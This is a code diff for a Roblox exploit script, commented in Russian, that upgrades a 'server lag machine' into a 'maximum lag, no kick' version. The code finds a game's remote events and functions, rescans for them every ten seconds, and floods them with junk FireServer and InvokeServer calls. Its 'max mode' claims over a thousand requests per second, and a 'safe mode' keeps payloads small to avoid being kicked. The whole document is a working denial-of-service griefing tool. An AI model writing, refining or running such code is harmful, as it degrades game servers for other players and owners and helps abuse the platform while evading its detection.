@@ -1,4 +1,4 @@
--- REAL SERVER LAG MACHINE
+-- MAXIMUM SERVER LAG (No Kick)
 local player = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -10,7 +10,7 @@ local foundRemotes = {}
 
 -- GUI
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ServerLagGUI"
+screenGui.Name = "MaxLagGUI"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = player:WaitForChild("PlayerGui")
@@ -40,7 +40,7 @@ headerCorner.Parent = header
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(0.7, 0, 1, 0)
 title.Position = UDim2.new(0, 15, 0, 0)
-title.Text = "SERVER LAG"
+title.Text = "MAX LAG MODE"
 title.TextColor3 = Color3.fromRGB(220, 220, 220)
 title.BackgroundTransparency = 1
 title.TextSize = 16
@@ -82,7 +82,7 @@ sectionCorner.Parent = lagSection
 local lagTitle = Instance.new("TextLabel")
 lagTitle.Size = UDim2.new(1, -10, 0, 25)
 lagTitle.Position = UDim2.new(0, 10, 0, 5)
-lagTitle.Text = "Server Lag System"
+lagTitle.Text = "Maximum Lag - No Kick"
 lagTitle.TextColor3 = Color3.fromRGB(180, 180, 200)
 lagTitle.BackgroundTransparency = 1
 lagTitle.TextSize = 12
@@ -93,7 +93,7 @@ lagTitle.Parent = lagSection
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Size = UDim2.new(1, -10, 0, 60)
 statusLabel.Position = UDim2.new(0, 10, 0, 30)
-statusLabel.Text = "Status: DISABLED\nRemotes: 0\nRequests: 0"
+statusLabel.Text = "Status: DISABLED\nRequests: 0\nMode: Safe"
 statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 statusLabel.BackgroundTransparency = 1
 statusLabel.TextSize = 12
@@ -126,8 +126,8 @@ local function createActionButton(xPosition, text, color)
     return btn
 end
 
-local toggleBtn = createActionButton(0, "ENABLE LAG", Color3.fromRGB(200, 60, 60))
-local refreshBtn = createActionButton(0.52, "FIND REMOTES", Color3.fromRGB(80, 120, 200))
+local toggleBtn = createActionButton(0, "MAX LAG ON", Color3.fromRGB(200, 60, 60))
+local modeBtn = createActionButton(0.52, "SAFE MODE", Color3.fromRGB(80, 120, 200))
 
 -- Функции для кнопок
 local function setupButtonHover(button)
@@ -142,9 +142,10 @@ end
 
 setupButtonHover(closeBtn)
 setupButtonHover(toggleBtn)
-setupButtonHover(refreshBtn)
+setupButtonHover(modeBtn)
 
 local scriptRunning = true
+local safeMode = true
 
 local function closeGUI()
     scriptRunning = false
@@ -181,92 +182,126 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- НАХОДИМ REAL REMOTE EVENTS И FUNCTIONS
+-- АВТОМАТИЧЕСКИЙ ПОИСК REMOTE ОБЪЕКТОВ
 local function findRemoteObjects()
     foundRemotes = {}
     
-    -- Ищем во всех важных местах
+    -- Ищем во всех местах
     local searchLocations = {
         ReplicatedStorage,
         workspace,
-        game:GetService("Lighting"),
-        game:GetService("StarterPack"),
-        game:GetService("StarterPlayer"),
-        game:GetService("StarterGui")
+        game:GetService("Players"),
+        game:GetService("Lighting")
     }
     
     for _, location in pairs(searchLocations) do
-        for _, obj in pairs(location:GetDescendants()) do
-            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
-                table.insert(foundRemotes, obj)
+        pcall(function()
+            for _, obj in pairs(location:GetDescendants()) do
+                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+                    table.insert(foundRemotes, obj)
+                end
             end
-        end
+        end)
     end
     
-    statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
-    print("📡 Found " .. #foundRemotes .. " remote objects")
+    print("📡 Auto-found " .. #foundRemotes .. " remote objects")
 end
 
--- РЕАЛЬНЫЕ ЗАПРОСЫ НА СЕРВЕР
-local function sendRealRequests()
+-- МАКСИМАЛЬНЫЕ ЛАГИ БЕЗ КИКОВ
+local function sendMaximumRequests()
     if not LagEnabled or #foundRemotes == 0 then return end
     
-    for i = 1, math.min(5, #foundRemotes) do
-        local remote = foundRemotes[math.random(1, #foundRemotes)]
+    -- Используем все найденные Remote объекты
+    for i, remote in pairs(foundRemotes) do
+        if not LagEnabled then break end
         
         pcall(function()
             if remote:IsA("RemoteEvent") then
-                -- Отправляем разные типы данных
-                local dataTypes = {
-                    math.random(1, 1000000),
-                    "lag_request_" .. requestCount,
-                    Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)),
-                    {action = "test", count = requestCount, time = tick()},
+                -- Легкие данные для безопасности
+                local safeData = {
+                    math.random(1, 100),
+                    "action_" .. math.random(1, 10),
+                    Vector3.new(math.random(-10, 10), 0, math.random(-10, 10)),
+                    {x = math.random(1, 10), y = math.random(1, 10)},
                     true,
                     false
                 }
                 
-                local data = dataTypes[math.random(1, #dataTypes)]
+                local data = safeData[math.random(1, #safeData)]
                 remote:FireServer(data)
                 requestCount = requestCount + 1
                 
             elseif remote:IsA("RemoteFunction") then
-                remote:InvokeServer("invoke_test_" .. requestCount, math.random())
+                remote:InvokeServer("request_" .. math.random(1, 100), math.random(1, 100))
                 requestCount = requestCount + 1
             end
         end)
         
-        wait(0.01) -- Короткая задержка
+        -- Без задержки для максимальной скорости
+        if safeMode then
+            wait(0.001) -- Минимальная задержка в безопасном режиме
+        end
+        -- В небезопасном режиме - без задержки вообще
     end
 end
+
+-- ДОПОЛНИТЕЛЬНЫЙ ИНТЕНСИВНЫЙ СПАМ
+local function intensiveSpam()
+    if not LagEnabled or #foundRemotes == 0 then return end
+    
+    for i = 1, 10 do
+        if not LagEnabled then break end
+        
+        local remote = foundRemotes[math.random(1, #foundRemotes)]
+        pcall(function()
+            if remote:IsA("RemoteEvent") then
+                for j = 1, 5 do
+                    remote:FireServer("fast_spam_" .. j, math.random())
+                    requestCount = requestCount + 1
+                end
+            end
+        end)
+        
+        if safeMode then
+            wait(0.0001)
+        end
+    end
+end
+
+-- Переключение режима безопасности
+modeBtn.MouseButton1Click:Connect(function()
+    safeMode = not safeMode
+    
+    if safeMode then
+        modeBtn.Text = "SAFE MODE"
+        modeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 200)
+        statusLabel.Text = string.format("Status: %s\nRequests: %d\nMode: Safe", LagEnabled and "ENABLED" or "DISABLED", requestCount)
+        print("🛡️ Safe mode enabled")
+    else
+        modeBtn.Text = "MAX MODE"
+        modeBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 60)
+        statusLabel.Text = string.format("Status: %s\nRequests: %d\nMode: MAXIMUM", LagEnabled and "ENABLED" or "DISABLED", requestCount)
+        print("💥 MAXIMUM mode enabled - extreme lag!")
+    end
+end)
 
 -- Включение/выключение лагов
 toggleBtn.MouseButton1Click:Connect(function()
     LagEnabled = not LagEnabled
     
     if LagEnabled then
-        statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
+        statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
         statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-        toggleBtn.Text = "DISABLE LAG"
+        toggleBtn.Text = "MAX LAG OFF"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
-        print("🚀 SERVER LAG ACTIVATED! Using " .. #foundRemotes .. " remotes")
+        print("🚀 MAXIMUM LAG ACTIVATED! Using " .. #foundRemotes .. " remotes")
     else
-        statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
+        statusLabel.Text = string.format("Status: DISABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
         statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-        toggleBtn.Text = "ENABLE LAG"
+        toggleBtn.Text = "MAX LAG ON"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
-        print("🛑 Server lag stopped")
+        print("🛑 Maximum lag stopped")
     end
-end)
-
-refreshBtn.MouseButton1Click:Connect(function()
-    findRemoteObjects()
-    local originalText = refreshBtn.Text
-    refreshBtn.Text = "REFRESHED!"
-    tweenService:Create(refreshBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(100, 180, 100)}):Play()
-    wait(1)
-    refreshBtn.Text = originalText
-    tweenService:Create(refreshBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 120, 200)}):Play()
 end)
 
 -- Клавиша L для переключения
@@ -277,29 +312,43 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         LagEnabled = not LagEnabled
         
         if LagEnabled then
-            statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
+            statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
             statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-            toggleBtn.Text = "DISABLE LAG"
+            toggleBtn.Text = "MAX LAG OFF"
             toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
         else
-            statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
+            statusLabel.Text = string.format("Status: DISABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
             statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            toggleBtn.Text = "ENABLE LAG"
+            toggleBtn.Text = "MAX LAG ON"
             toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
         end
     end
 end)
 
--- Система создания реальных лагов
+-- ОСНОВНОЙ ЦИКЛ МАКСИМАЛЬНЫХ ЛАГОВ
 spawn(function()
     while scriptRunning do
         if LagEnabled then
-            sendRealRequests()
-            statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
-            wait(0.1) -- 10 запросов в секунду
+            sendMaximumRequests()
+            intensiveSpam()
+            statusLabel.Text = string.format("Status: ENABLED\nRequests: %d\nMode: %s", requestCount, safeMode and "Safe" or "MAXIMUM")
+            
+            if safeMode then
+                wait(0.01) -- 100 запросов в секунду в безопасном режиме
+            else
+                wait(0.001) -- 1000+ запросов в секунду в максимальном режиме
+            end
         else
             wait(0.5)
         end
+    end
+end)
+
+-- Автоматический поиск Remote каждые 10 секунд
+spawn(function()
+    while scriptRunning do
+        findRemoteObjects()
+        wait(10)
     end
 end)
 
@@ -309,7 +358,8 @@ player.CharacterRemoving:Connect(function()
     if scriptRunning then closeGUI() end
 end)
 
-print("🎯 REAL SERVER LAG MACHINE LOADED!")
-print("📡 Found " .. #foundRemotes .. " remote objects")
-print("🎮 Click ENABLE LAG or press L to start")
-print("💥 Sending real requests to server!")
+print("💥💥💥 MAXIMUM SERVER LAG LOADED!")
+print("📡 Auto-found " .. #foundRemotes .. " remote objects")
+print("🎮 Click MAX LAG ON or press L to start")
+print("🛡️ Safe mode: Less lag but no kicks")
+print("💥 Max mode: Extreme lag (use carefully)")
